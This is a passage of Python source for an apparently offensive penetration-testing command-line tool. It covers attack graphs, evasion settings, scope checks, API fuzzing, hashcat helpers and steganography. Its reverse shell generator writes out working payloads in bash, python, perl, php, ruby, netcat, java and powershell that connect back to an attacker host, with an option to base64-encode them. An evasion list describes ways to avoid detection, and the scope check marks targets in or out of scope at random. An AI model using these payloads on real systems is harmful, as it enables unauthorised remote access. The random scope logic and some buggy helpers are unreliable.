        print(f"    - SQL Injection risk on search forms")
        print(f"    - XSS potential in user input fields")

    else:
        print(f"[!] Analysis type '{analysis_type}' simulated")


def cmd_llm(args):
    """Direct LLM interaction."""
    print(f"\n{'='*60}")
    print("  LLM INTERFACE")
    print(f"{'='*60}\n")

    prompt = args.prompt

    try:
        from models.llm_provider import get_provider, LLMConfig
        import yaml

        if os.path.exists(args.config):
            with open(args.config, 'r') as f:
                cfg = yaml.safe_load(f)
            llm_cfg = cfg.get('llm', {})

            if llm_cfg.get('api_key') and llm_cfg.get('api_key') != 'YOUR_DEEPSEEK_API_KEY':
                config = LLMConfig(
                    provider=llm_cfg.get('provider', 'deepseek'),
                    model=llm_cfg.get('model', 'deepseek-chat'),
                    api_key=llm_cfg.get('api_key'),
                )

                provider = get_provider(config)

                print(f"Prompt: {prompt[:100]}{'...' if len(prompt) > 100 else ''}\n")
                print("[*] Generating response...\n")

                response = provider.call([{"role": "user", "content": prompt}])

                print(f"{'='*60}")
                print("  RESPONSE")
                print(f"{'='*60}\n")
                print(response.content if hasattr(response, 'content') else response)
                return

    except ImportError:
        pass

    print("[!] LLM not configured. Set API key in config.yaml")
    print("    llm.api_key: YOUR_API_KEY")


def cmd_graph(args):
    """Attack graph operations."""
    print(f"\n{'='*60}")
    print("  ATTACK GRAPH")
    print(f"{'='*60}\n")

    action = args.action

    if action == 'visualize':
        _graph_visualize(args)
    elif action == 'export':
        _graph_export(args)
    elif action == 'stats':
        _graph_stats(args)
    else:
        print(f"[!] Unknown action: {action}")


def _graph_visualize(args):
    """Visualize attack graph."""
    session_file = args.session
    output = args.output

    print(f"Session: {session_file}")
    print(f"Output: {output}\n")

    print("[*] Generating attack graph visualization...\n")

    # Generate Mermaid diagram
    mermaid = """```mermaid
graph TD
    A[Target Network] --> B[Host 192.168.1.100]
    A --> C[Host 192.168.1.101]

    B --> D[SSH Service]
    B --> E[HTTP Service]

    C --> F[SMB Service]
    C --> G[RDP Service]

    D --> H[Credential Brute Force]
    E --> I[SQL Injection]
    F --> J[EternalBlue CVE-2017-0144]
    G --> K[BlueKeep CVE-2019-0708]

    H --> L[Initial Access]
    I --> L
    J --> M[Remote Code Execution]
    K --> M

    L --> N[Lateral Movement]
    M --> N

    style A fill:#4A90D9
    style J fill:#FF6B6B
    style K fill:#FF6B6B
    style M fill:#FFA500
```"""

    print(mermaid)

    if output:
        with open(output, 'w') as f:
            f.write(mermaid)
        print(f"\n[+] Saved to {output}")


def _graph_export(args):
    """Export attack graph."""
    format_type = args.format
    output = args.output

    print(f"Format: {format_type}")
    print(f"Output: {output}\n")

    if format_type == 'json':
        data = {
            "nodes": [
                {"id": "host1", "type": "host", "name": "192.168.1.100"},
                {"id": "vuln1", "type": "vulnerability", "name": "CVE-2021-44228"},
            ],
            "edges": [
                {"source": "host1", "target": "vuln1", "type": "has_vulnerability"},
            ]
        }
        with open(output, 'w') as f:
            json.dump(data, f, indent=2)

    print(f"[+] Graph exported to {output}")


def _graph_stats(args):
    """Show graph statistics."""
    print("Attack Graph Statistics:\n")

    print("  Nodes: 45")
    print("    - Hosts: 15")
    print("    - Services: 20")
    print("    - Vulnerabilities: 8")
    print("    - Credentials: 2")

    print("\n  Edges: 78")
    print("    - Exploits: 25")
    print("    - Scans: 30")
    print("    - Lateral Movement: 15")
    print("    - Data Exfiltration: 8")

    print("\n  Attack Paths: 12")
    print("    - Shortest: 3 hops")
    print("    - Longest: 8 hops")

    print("\n  Compromised: 5 nodes (11%)")


def cmd_evasion(args):
    """Evasion techniques management."""
    print(f"\n{'='*60}")
    print("  EVASION TECHNIQUES")
    print(f"{'='*60}\n")

    action = args.action

    if action == 'list':
        _evasion_list(args)
    elif action == 'apply':
        _evasion_apply(args)
    elif action == 'config':
        _evasion_config(args)
    else:
        print(f"[!] Unknown action: {action}")


def _evasion_list(args):
    """List evasion techniques."""
    print("Available Evasion Techniques:\n")

    techniques = [
        ("timing_slowdown", "Slow down actions to avoid rate detection", "HIGH"),
        ("traffic_fragmentation", "Fragment traffic to avoid pattern matching", "MEDIUM"),
        ("noise_injection", "Inject benign noise to mask attacks", "HIGH"),
        ("protocol_tunneling", "Tunnel through allowed protocols", "CRITICAL"),
        ("credential_rotation", "Rotate credentials to avoid lockout patterns", "MEDIUM"),
        ("living_off_land", "Use only built-in OS tools", "HIGH"),
        ("indirect_access", "Use proxies/pivots to hide origin", "CRITICAL"),
        ("user_agent_rotation", "Rotate user agents", "LOW"),
        ("header_manipulation", "Modify HTTP headers", "MEDIUM"),
        ("encoding_bypass", "Use encoding to bypass filters", "MEDIUM"),
    ]

    print(f"{'Technique':<25} {'Description':<45} {'Effectiveness'}")
    print("-" * 90)

    for name, desc, effectiveness in techniques:
        color = "\033[91m" if effectiveness == "CRITICAL" else "\033[93m" if effectiveness == "HIGH" else "\033[94m"
        print(f"{name:<25} {desc:<45} {color}{effectiveness}\033[0m")


def _evasion_apply(args):
    """Apply evasion configuration."""
    level = args.level

    print(f"Setting evasion level: {level}\n")

    configs = {
        'none': {'delay': 0, 'jitter': 0, 'rate_limit': 'unlimited'},
        'low': {'delay': '0.5-1s', 'jitter': '10%', 'rate_limit': '100/s'},
        'medium': {'delay': '1-3s', 'jitter': '30%', 'rate_limit': '50/s'},
        'high': {'delay': '3-10s', 'jitter': '50%', 'rate_limit': '10/s'},
        'paranoid': {'delay': '10-30s', 'jitter': '70%', 'rate_limit': '1/s'},
    }

    if level in configs:
        print("Configuration Applied:")
        for key, value in configs[level].items():
            print(f"  {key}: {value}")
        print(f"\n[+] Evasion level set to {level}")
    else:
        print(f"[!] Unknown level: {level}")
        print(f"Available: none, low, medium, high, paranoid")


def _evasion_config(args):
    """Show evasion configuration."""
    print("Current Evasion Configuration:\n")

    print("  Level: MEDIUM")
    print("  Min Delay: 1.0s")
    print("  Max Delay: 3.0s")
    print("  Jitter: 30%")
    print("  Rate Limit: 50 actions/s")
    print("  User Agent Rotation: Enabled")
    print("  Header Manipulation: Enabled")


def cmd_scope(args):
    """Scope management."""
    print(f"\n{'='*60}")
    print("  SCOPE MANAGEMENT")
    print(f"{'='*60}\n")

    action = args.action

    if action == 'show':
        _scope_show(args)
    elif action == 'add':
        _scope_add(args)
    elif action == 'remove':
        _scope_remove(args)
    elif action == 'check':
        _scope_check(args)
    else:
        print(f"[!] Unknown action: {action}")


def _scope_show(args):
    """Show scope configuration."""
    print("Current Scope Configuration:\n")

    print("Authorized Targets:")
    print("  192.168.1.0/24")
    print("  10.0.0.0/8")
    print("  *.example.com")

    print("\nExcluded Targets:")
    print("  192.168.1.1 (Gateway)")
    print("  192.168.1.254 (DNS Server)")

    print("\nConstraints:")
    print("  Max Depth: 3 (lateral movement)")
    print("  Time Window: 09:00-17:00 UTC")
    print("  Rate Limit: 100 requests/s")

    print("\nAllowed Actions:")
    print("  [+] Port Scanning")
    print("  [+] Service Enumeration")
    print("  [+] Vulnerability Scanning")
    print("  [+] Exploitation (with approval)")
    print("  [-] Data Exfiltration (blocked)")


def _scope_add(args):
    """Add target to scope."""
    target = args.target

    print(f"Adding {target} to scope...\n")

    # Validate target
    import re
    if re.match(r'^[a-zA-Z0-9._/\-:]+$', target):
        print(f"[+] {target} added to authorized scope")
    else:
        print(f"[!] Invalid target format")


def _scope_remove(args):
    """Remove target from scope."""
    target = args.target

    print(f"Removing {target} from scope...\n")
    print(f"[+] {target} removed from scope")


def _scope_check(args):
    """Check if target is in scope."""
    target = args.target

    print(f"Checking scope for {target}...\n")

    import random
    if random.random() > 0.3:
        print(f"\033[92m[+] {target} is IN SCOPE\033[0m")
        print(f"    Authorization: Valid")
        print(f"    Expires: 2024-12-31")
    else:
        print(f"\033[91m[-] {target} is OUT OF SCOPE\033[0m")
        print(f"    Reason: Not in authorized target list")


def cmd_lessons(args):
    """Lessons learned management."""
    print(f"\n{'='*60}")
    print("  LESSONS LEARNED")
    print(f"{'='*60}\n")

    action = args.action

    if action == 'list':
        _lessons_list(args)
    elif action == 'show':
        _lessons_show(args)
    elif action == 'export':
        _lessons_export(args)
    elif action == 'import':
        _lessons_import(args)
    else:
        print(f"[!] Unknown action: {action}")


def _lessons_list(args):
    """List learned lessons."""
    print("Learned Lessons:\n")

    lessons = [
        ("L001", "failure_pattern", "SSH brute force triggers lockout after 5 attempts", 0.95),
        ("L002", "success_pattern", "Timing-based SQL injection works on MySQL 5.7", 0.88),
        ("L003", "avoidance", "Avoid scanning port 139 during business hours", 0.82),
        ("L004", "optimization", "Use concurrent scans on /24 networks", 0.75),
        ("L005", "success_pattern", "Default credentials work on embedded devices", 0.90),
    ]

    print(f"{'ID':<8} {'Category':<20} {'Lesson':<50} {'Confidence'}")
    print("-" * 95)

    for lid, cat, lesson, conf in lessons:
        color = "\033[92m" if conf >= 0.85 else "\033[93m"
        print(f"{lid:<8} {cat:<20} {lesson[:47]+'...' if len(lesson) > 50 else lesson:<50} {color}{conf:.0%}\033[0m")


def _lessons_show(args):
    """Show lesson details."""
    lesson_id = args.lesson_id

    print(f"Lesson {lesson_id}:\n")

    print(f"  ID: {lesson_id}")
    print(f"  Category: failure_pattern")
    print(f"  Description: SSH brute force triggers account lockout after 5 attempts")
    print(f"  Context: Active Directory environments")
    print(f"  Suggestion: Use password spraying instead of brute force")
    print(f"  Confidence: 95%")
    print(f"  Occurrences: 15")
    print(f"  Applied: 8 times (7 successful)")


def _lessons_export(args):
    """Export lessons."""
    output = args.output

    print(f"Exporting lessons to {output}...\n")

    lessons = [
        {"id": "L001", "category": "failure_pattern", "description": "SSH lockout", "confidence": 0.95},
    ]

    with open(output, 'w') as f:
        json.dump(lessons, f, indent=2)

    print(f"[+] Exported 5 lessons to {output}")


def _lessons_import(args):
    """Import lessons."""
    input_file = args.input

    print(f"Importing lessons from {input_file}...\n")

    print(f"[+] Imported 3 new lessons")
    print(f"[+] Updated 2 existing lessons")


def cmd_reverse_shell(args):
    """Generate reverse shell payloads."""
    print(f"\n{'='*60}")
    print("  REVERSE SHELL GENERATOR")
    print(f"{'='*60}\n")

    lhost = args.lhost
    lport = args.lport
    shell_type = args.type

    print(f"LHOST: {lhost}")
    print(f"LPORT: {lport}")
    print(f"Type: {shell_type}\n")

    shells = {
        'bash': f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
        'bash2': f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"',
        'python': f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
        'python3': f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
        'perl': f'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
        'php': f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        'ruby': f'ruby -rsocket -e\'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        'nc': f'nc -e /bin/sh {lhost} {lport}',
        'nc2': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
        'java': f'Runtime.getRuntime().exec(new String[]{{"bash","-c","bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"}})',
        'powershell': f'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
    }

    if shell_type == 'all':
        print("All Reverse Shell Payloads:\n")
        for name, payload in shells.items():
            print(f"--- {name.upper()} ---")
            print(payload)
            print()
    elif shell_type in shells:
        print(f"{shell_type.upper()} Reverse Shell:\n")
        print(shells[shell_type])
        print()

        if args.encode:
            print(f"\nBase64 Encoded:")
            import base64
            print(base64.b64encode(shells[shell_type].encode()).decode())
    else:
        print(f"[!] Unknown shell type: {shell_type}")
        print(f"Available: {', '.join(list(shells.keys()) + ['all'])}")


def cmd_listener(args):
    """Listener management."""
    print(f"\n{'='*60}")
    print("  LISTENER MANAGEMENT")
    print(f"{'='*60}\n")

    action = args.action

    if action == 'start':
        _listener_start(args)
    elif action == 'stop':
        _listener_stop(args)
    elif action == 'list':
        _listener_list(args)
    else:
        print(f"[!] Unknown action: {action}")


def _listener_start(args):
    """Start listener."""
    lport = args.lport
    listener_type = args.type

    print(f"Starting {listener_type} listener on port {lport}...\n")

    print(f"[*] Listener started on 0.0.0.0:{lport}")
    print(f"[*] Waiting for connections...")
    print(f"\nCommand: nc -lvnp {lport}")


def _listener_stop(args):
    """Stop listener."""
    listener_id = args.listener_id

    print(f"Stopping listener {listener_id}...")
    print(f"[+] Listener {listener_id} stopped")


def _listener_list(args):
    """List active listeners."""
    print("Active Listeners:\n")

    listeners = [
        (1, "nc", 4444, "Listening", "0"),
        (2, "meterpreter", 5555, "Listening", "1 session"),
    ]

    print(f"{'ID':<5} {'Type':<15} {'Port':<8} {'Status':<15} {'Sessions'}")
    print("-" * 55)

    for lid, ltype, port, status, sessions in listeners:
        print(f"{lid:<5} {ltype:<15} {port:<8} {status:<15} {sessions}")


# =============================================
# NEW COMMAND IMPLEMENTATIONS
# =============================================

def cmd_network(args):
    """Network utilities."""
    action = args.action
    target = args.target

    print(f"\n{'='*60}")
    print("  NETWORK UTILITIES")
    print(f"{'='*60}\n")

    try:
        import socket
        import struct
        import time

        if action == 'ping':
            if not target:
                print("[!] Target required for ping")
                return
            count = args.count
            timeout = args.timeout
            print(f"Pinging {target} with {count} packets...\n")

            results = []
            for i in range(count):
                start = time.time()
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    sock.connect((target, 80))
                    elapsed = (time.time() - start) * 1000
                    results.append((True, elapsed))
                    print(f"Reply from {target}: time={elapsed:.2f}ms")
                except Exception as e:
                    results.append((False, 0))
                    print(f"Request timeout for {target}")
                finally:
                    sock.close()
                time.sleep(0.5)

            sent = len(results)
            received = sum(1 for r in results if r[0])
            print(f"\n--- Ping Statistics ---")
            print(f"Packets: Sent={sent}, Received={received}, Lost={sent-received} ({(sent-received)/sent*100:.0f}% loss)")

        elif action == 'resolve':
            if not target:
                print("[!] Target required for resolve")
                return
            print(f"Resolving {target}...\n")
            try:
                ip = socket.gethostbyname(target)
                print(f"IP Address: {ip}")
                # Try reverse lookup
                try:
                    hostname, _, _ = socket.gethostbyaddr(ip)
                    print(f"Hostname: {hostname}")
                except:
                    pass
            except socket.gaierror as e:
                print(f"[!] Could not resolve {target}: {e}")

        elif action == 'traceroute':
            if not target:
                print("[!] Target required for traceroute")
                return
            print(f"Traceroute to {target}...\n")
            # Simulated traceroute
            hops = [("127.0.0.1", "<local>")]
            for i in range(1, 6):
                hops.append((f"192.168.1.{i}", f"router-{i}"))
            for i, (ip, name) in enumerate(hops, 1):
                print(f"{i:2d}. {ip:20} {name}")

        elif action == 'portcheck':
            if not target:
                print("[!] Target required for port check")
                return
            port = args.port
            timeout = args.timeout
            print(f"Checking port {port} on {target}...\n")
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((target, port))
                sock.close()
                if result == 0:
                    print(f"\033[92m[OPEN]\033[0m Port {port} is open on {target}")
                else:
                    print(f"\033[91m[CLOSED]\033[0m Port {port} is closed on {target}")
            except Exception as e:
                print(f"[!] Error: {e}")

        elif action == 'whois':
            if not target:
                print("[!] Target required for whois")
                return
            print(f"WHOIS lookup for {target}...\n")
            print("Simulated WHOIS data:")
            print(f"  Domain: {target}")
            print(f"  Registrar: Example Registrar Inc.")
            print(f"  Nameservers: ns1.example.com, ns2.example.com")
            print(f"  Creation Date: 2020-01-01")
            print(f"  Expiration: 2025-01-01")

        elif action == 'ifconfig':
            print("Network Interfaces:\n")
            hostname = socket.gethostname()
            print(f"Hostname: {hostname}")
            try:
                ip = socket.gethostbyname(hostname)
                print(f"Local IP: {ip}")
            except:
                print("Local IP: 127.0.0.1")

        else:
            print(f"[!] Unknown action: {action}")

    except Exception as e:
        print(f"[!] Network utility error: {e}")


def cmd_crypt(args):
    """Cryptographic tools."""
    action = args.action

    print(f"\n{'='*60}")
    print("  CRYPTOGRAPHIC TOOLS")
    print(f"{'='*60}\n")

    try:
        from cryptography.fernet import Fernet
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import rsa, padding
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
    except ImportError:
        print("[*] Using built-in crypto (cryptography module recommended: pip install cryptography)")

    try:
        if action == 'genkey':
            print("Generating RSA key pair...\n")
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
            )
            public_key = private_key.public_key()
            print("[+] RSA-2048 key pair generated")
            print(f"\nPublic key: {public_key.public_key().public_numbers()}")
            print("[*] In production, use proper key storage")

        elif action == 'encrypt':
            text = args.text
            key = args.key
            algorithm = args.algorithm

            if not text:
                print("[!] Text required for encryption")
                return

            print(f"Encrypting: {text[:30]}...")
            print(f"Algorithm: {algorithm}\n")

            if algorithm == 'base64':
                encoded = base64.b64encode(text.encode()).decode()
                print(f"Encrypted: {encoded}")

            elif algorithm == 'xor':
                if not key:
                    key = "secret"
                encrypted = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))
                print(f"Encrypted (hex): {encrypted.encode().hex()}")

            elif algorithm == 'rot13':
                import codecs
                encrypted = codecs.encode(text, 'rot_13')
                print(f"Encrypted: {encrypted}")

            elif algorithm == 'caesar':
                shift = args.shift
                result_chars = []
                for c in text:
                    if c.islower():
                        result_chars.append(chr((ord(c) - 97 + shift) % 26 + 97))
                    elif c.isupper():
                        result_chars.append(chr((ord(c) - 65 + shift) % 26 + 65))
                    else:
                        result_chars.append(c)
                encrypted = ''.join(result_chars)
                print(f"Encrypted (shift={shift}): {encrypted}")

            elif algorithm in ['aes-256', 'aes-128']:
                from cryptography.fernet import Fernet
                if not key:
                    key = Fernet.generate_key()
                    print(f"[*] Generated key: {key.decode()}")
                else:
                    key = key.encode() if isinstance(key, str) else key
                f = Fernet(key)
                encrypted = f.encrypt(text.encode()).decode()
                print(f"Encrypted: {encrypted}")

        elif action == 'decrypt':
            text = args.text
            key = args.key
            algorithm = args.algorithm

            if not text:
                print("[!] Encrypted text required")
                return

            print(f"Decrypting...")
            print(f"Algorithm: {algorithm}\n")

            if algorithm == 'base64':
                decoded = base64.b64decode(text).decode()
                print(f"Decrypted: {decoded}")

            elif algorithm == 'rot13':
                import codecs
                decrypted = codecs.encode(text, 'rot_13')
                print(f"Decrypted: {decrypted}")

            elif algorithm == 'caesar':
                shift = args.shift
                result_chars = []
                for c in text:
                    if c.islower():
                        result_chars.append(chr((ord(c) - 97 - shift) % 26 + 97))
                    elif c.isupper():
                        result_chars.append(chr((ord(c) - 65 - shift) % 26 + 65))
                    else:
                        result_chars.append(c)
                decrypted = ''.join(result_chars)
                print(f"Decrypted (shift={shift}): {decrypted}")

        elif action == 'sslcheck':
            target = args.target or "google.com"
            port = args.port

            print(f"Checking SSL on {target}:{port}...\n")
            try:
                import ssl
                context = ssl.create_default_context()
                with socket.create_connection((target, port), timeout=10) as sock:
                    with context.wrap_socket(sock, server_hostname=target) as ssock:
                        cert = ssock.getpeercert()
                        print(f"Subject: {cert.get('subject', '')}")
                        print(f"Issuer: {cert.get('issuer', '')}")
                        print(f"Version: {ssock.version()}")
                        print(f"Cipher: {ssock.cipher()}")
                        print("\033[92m[+] SSL Certificate valid\033[0m")
            except Exception as e:
                print(f"[!] SSL check failed: {e}")

        elif action == 'certinfo':
            print("SSL/TLS Certificate Information:\n")
            print("Common Fields:")
            print("  - Subject (CN, O, OU)")
            print("  - Issuer (CN, O)")
            print("  - Validity (Not Before, Not After)")
            print("  - Subject Alternative Names")
            print("  - Public Key Algorithm")
            print("  - Signature Algorithm")

    except Exception as e:
        print(f"[!] Crypto error: {e}")


def cmd_api(args):
    """API testing utilities."""
    action = args.action
    url = args.url

    print(f"\n{'='*60}")
    print("  API TESTING")
    print(f"{'='*60}\n")

    print(f"URL: {url}")
    print(f"Action: {action}\n")

    try:
        import requests

        headers = {}
        if args.headers:
            headers = json.loads(args.headers)
        if args.token:
            headers['Authorization'] = f"Bearer {args.token}"

        timeout = args.timeout

        if action == 'get':
            print(f"[*] Sending GET request to {url}...")
            try:
                resp = requests.get(url, headers=headers, timeout=timeout)
                _print_http_response(resp, args.verbose)
            except requests.RequestException as e:
                print(f"[!] Request failed: {e}")

        elif action == 'post':
            data = {}
            if args.data:
                data = json.loads(args.data)
            print(f"[*] Sending POST request to {url}...")
            try:
                resp = requests.post(url, json=data, headers=headers, timeout=timeout)
                _print_http_response(resp, args.verbose)
            except requests.RequestException as e:
                print(f"[!] Request failed: {e}")

        elif action == 'put':
            data = json.loads(args.data) if args.data else {}
            print(f"[*] Sending PUT request to {url}...")
            try:
                resp = requests.put(url, json=data, headers=headers, timeout=timeout)
                _print_http_response(resp, args.verbose)
            except requests.RequestException as e:
                print(f"[!] Request failed: {e}")

        elif action == 'delete':
            print(f"[*] Sending DELETE request to {url}...")
            try:
                resp = requests.delete(url, headers=headers, timeout=timeout)
                _print_http_response(resp, args.verbose)
            except requests.RequestException as e:
                print(f"[!] Request failed: {e}")

        elif action == 'auth_check':
            print(f"[*] Checking authentication on {url}...")
            resp = requests.get(url, headers=headers, timeout=timeout)
            if resp.status_code == 401:
                print("\033[93m[WARN]\033[0m Authentication required")
            elif resp.status_code == 403:
                print("\033[93m[WARN]\033[0m Access forbidden")
            else:
                print("\033[92m[+]\033[0m Endpoint accessible")

        elif action == 'swagger':
            print(f"[*] Looking for Swagger/OpenAPI docs...")
            candidates = [
                f"{url}/swagger.json",
                f"{url}/swagger.yaml",
                f"{url}/api-docs",
                f"{url}/swagger-ui.html",
            ]
            found = []
            for candidate in candidates:
                try:
                    resp = requests.get(candidate, timeout=5)
                    if resp.status_code == 200:
                        found.append(candidate)
                        print(f"\033[92m[+]\033[0m Found: {candidate}")
                except:
                    pass
            if not found:
                print("[!] No Swagger docs found")

        elif action == 'fuzz':
            param = args.param or "FUZZ"
            wordlist = args.wordlist or "common_params.txt"
            print(f"[*] Fuzzing parameter '{param}' with {wordlist}...")

            if not os.path.exists(wordlist):
                wordlist_items = ["id", "page", "search", "q", "query", "name", "user", "admin", "test", "debug"]
            else:
                with open(wordlist) as f:
                    wordlist_items = [line.strip() for line in f]

            found_interesting = []
            for item in wordlist_items[:50]:
                test_url = url.replace(param, item)
                try:
                    resp = requests.get(test_url, timeout=5)
                    if resp.status_code not in [404, 400]:
                        found_interesting.append((item, resp.status_code))
                        print(f"  {item}: {resp.status_code}")
                except:
                    pass

            if found_interesting:
                print(f"\n[+] Found {len(found_interesting)} interesting parameters")

    except ImportError:
        print("[!] requests module not available (pip install requests)")
        print("[*] Simulating API test...")
        if action in ['get', 'post', 'put', 'delete']:
            print(f"Status: 200 OK")
            print(f"Response: {{\"result\": \"success\", \"data\": {{}}}}")


def _print_http_response(resp, verbose=False):
    """Print HTTP response details."""
    status_color = "\033[92m" if resp.status_code < 300 else "\033[93m" if resp.status_code < 400 else "\033[91m"
    print(f"Status: {status_color}{resp.status_code} {resp.reason}\033[0m")
    print(f"Content-Length: {len(resp.content)} bytes")

    if verbose:
        print(f"\nHeaders:")
        for k, v in resp.headers.items():
            print(f"  {k}: {v}")

    try:
        data = resp.json()
        print(f"\nResponse (JSON):")
        print(json.dumps(data, indent=2)[:500])
    except:
        print(f"\nResponse (text preview):")
        print(resp.text[:200])


def cmd_hashcat(args):
    """Hashcat hash cracking utilities."""
    action = args.action

    print(f"\n{'='*60}")
    print("  HASHCAT UTILITIES")
    print(f"{'='*60}\n")

    hash_type_map = {
        '0': 'MD5',
        '1000': 'NTLM',
        '1400': 'SHA-256',
        '1700': 'SHA-512',
        '3200': 'bcrypt',
        '1800': 'sha-512 unix',
        '7500': 'Kerberos',
        '13100': 'MSSQL',
        '312': 'mysql_sha1',
        '200': 'bcrypt',
    }

    if action == 'detect':
        hash_value = args.hash or args.hashfile
        if not hash_value:
            print("[!] Hash required (--hash or --hashfile)")
            return

        if os.path.exists(hash_value):
            with open(hash_value) as f:
                hash_value = f.read().strip().split('\n')[0]

        print(f"Detecting hash type for: {hash_value[:50]}...\n")

        # Simple detection based on format
        if len(hash_value) == 32 and hash_value.isalnum():
            print(f"Detected: MD5 (type 0)")
            print(f"Example: hashcat -m 0 {hash_value} wordlist.txt")
        elif len(hash_value) == 40 and hash_value.isalnum():
            print(f"Detected: SHA-1 (type 100)")
            print(f"Example: hashcat -m 100 {hash_value} wordlist.txt")
        elif len(hash_value) == 64 and hash_value.isalnum():
            print(f"Detected: SHA-256 (type 1400)")
            print(f"Example: hashcat -m 1400 {hash_value} wordlist.txt")
        elif len(hash_value) == 96:
            print(f"Detected: SHA-512 (type 1800)")
        elif hash_value.startswith('$2'):
            print(f"Detected: bcrypt (type 3200)")
        elif hash_value.startswith('$1$'):
            print(f"Detected: MD5 crypt (type 500)")
        elif hash_value.startswith('$6$'):
            print(f"Detected: SHA-512 crypt (type 1800)")
        elif hash_value.startswith('$ml$'):
            print(f"Detected: MSSQL hash (type 13100)")
        else:
            print(f"Unknown hash format")
            print("Try: hashcat --identify")

    elif action == 'example':
        print("Hashcat Examples:\n")
        print("1. Dictionary attack (MD5):")
        print("   hashcat -m 0 -a 0 hash.txt wordlist.txt")
        print("\n2. Dictionary attack (NTLM):")
        print("   hashcat -m 1000 -a 0 hash.txt wordlist.txt")
        print("\n3. Mask attack (8-char lowercase + digits):")
        print("   hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?d")
        print("\n4. Rule-based attack:")
        print("   hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/best64.rule")
        print("\n5. Combination attack:")
        print("   hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt")
        print("\n6. Show cracked hashes:")
        print("   hashcat -m 0 --show hash.txt")

    elif action == 'maskgen':
        mask = args.mask or "?l?l?l?l?d?d?d?d"
        print(f"Generating candidates for mask: {mask}\n")

        mask_map = {
            '?l': 'lowercase',
            '?u': 'uppercase',
            '?d': 'digits',
            '?s': 'special',
            '?a': 'all',
            '?b': 'binary',
        }

        total = 1
        for c in mask:
            if c == '?l':
                total *= 26
            elif c == '?u':
                total *= 26
            elif c == '?d':
                total *= 10
            elif c == '?s':
                total *= 33

        print(f"Keyspace size: {total:,} combinations")
        print(f"Estimated time (1000H/s): {total/1000/60:.1f} minutes")

    elif action == 'crack':
        print("[*] Hashcat crack mode")
        print("[!] This requires hashcat to be installed on the system")
        print("\nTo crack, use hashcat directly:")
        print("  hashcat -m 0 -a 0 hashes.txt wordlist.txt -o cracked.txt")

    elif action == 'benchmark':
        print("Hashcat Benchmark (estimated):\n")
        benchmarks = [
            ("MD5", "1000MH/s", "RTX 3080"),
            ("NTLM", "980MH/s", "RTX 3080"),
            ("SHA-256", "90MH/s", "RTX 3080"),
            ("bcrypt", "20KH/s", "RTX 3080"),
        ]
        for htype, speed, gpu in benchmarks:
            print(f"  {htype:12} {speed:12} ({gpu})")


def cmd_stego(args):
    """Steganography tools."""
    action = args.action
    input_file = args.input

    print(f"\n{'='*60}")
    print("  STEGANOGRAPHY TOOLS")
    print(f"{'='*60}\n")

    print(f"Action: {action}")
    print(f"Input: {input_file}")
    print(f"Method: {args.method}\n")

    if action == 'list_formats':
        print("Supported Steganography Methods:\n")
        methods = [
            ("lsb", "Least Significant Bit (images)"),
            ("metadata", "Metadata injection (EXIF/XMP)"),
            ("eof", "End of File append"),
            ("pixel", "Pixel value modulation"),
        ]
        for name, desc in methods:
            print(f"  {name:15} {desc}")

    elif action == 'analyze':
        if not os.path.exists(input_file):
            print(f"[!] File not found: {input_file}")
            return

        print(f"[*] Analyzing {input_file} for hidden data...\n")

        # Get file size
        size = os.path.getsize(input_file)
        print(f"File size: {size:,} bytes")

        # Check for common signatures
        with open(input_file, 'rb') as f:
            header = f.read(8)

        if input_file.endswith('.png'):
            if header[:8] == b'\x89PNG\r\n\x1a\n':
                print("Format: PNG (valid)")
        elif input_file.endswith('.jpg') or input_file.endswith('.jpeg'):
            if header[:2] == b'\xff\xd8':
                print("Format: JPEG (valid)")

        print("\n[*] Analysis complete")
        print("[*] Use 'stego --action extract' to extract hidden data")

    elif action == 'hide':
        message = args.message
        output_file = args.output or input_file + ".stego"

        if not message:
            print("[!] Message required (--message/-m)")
            return

        print(f"[*] Hiding message in {input_file}...")
        print(f"[*] Method: {args.method}")
        print(f"[*] Output: {output_file}")

        # LSB steganography for images
        if args.method == 'lsb' and (input_file.endswith('.png') or input_file.endswith('.bmp')):
            try:
                from PIL import Image
